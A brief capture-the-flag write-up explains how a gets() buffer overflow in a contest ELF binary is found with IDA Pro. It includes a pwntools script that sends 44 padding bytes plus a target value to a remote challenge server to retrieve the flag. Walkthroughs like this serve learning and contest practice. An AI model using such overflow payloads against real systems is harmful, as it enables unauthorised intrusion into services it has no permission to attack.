A little endian 64-bit ELF binary file is provided, so we have to decompile it using the IDA Pro 64 version application for analysis.\

\
After the analysis found the following functions:\

\
there is a gets function which can be guaranteed to be vuln when the inputted character exceeds its limit (buffer overflow) because the buff overflow system is changing memory after the buff, so here we can use that function to exploit\
We try to test input A until it exceeds the max memory so that a SEGFAULT error appears. Let's try to exploit it\

```py
from pwn import *

exe = ELF("./chall")
# io = exe.process()
io = remote("202.125.94.123", 60901)

#target 0x1337C0DE
payload = "A" * (44)
payload += "\xDE\xC0\x37\x13"

io.sendline(payload)
io.interactive()
```

\
And we got the flag `hackfest0x5{Buffer_0verflow_1s_Danger0us_Yo!!}`
